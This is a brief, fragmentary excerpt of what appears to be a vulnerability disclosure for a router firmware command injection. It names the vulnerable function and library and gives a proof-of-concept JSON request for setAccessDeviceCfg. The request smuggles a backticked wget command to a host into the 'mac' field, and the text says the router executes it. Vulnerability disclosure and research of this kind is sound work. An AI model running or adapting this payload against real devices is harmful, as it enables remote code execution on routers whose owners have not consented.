...
In sub_42ABE4 function, it reads in a user-provided parameter `mac` and passes its value to Uci_Add_List function by strcat ,which is defined in libcscommon.so.
...
We set `mac` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setAccessDeviceCfg","mac":"`wget 192.168.6.1:7777/testpoc`"
}
```
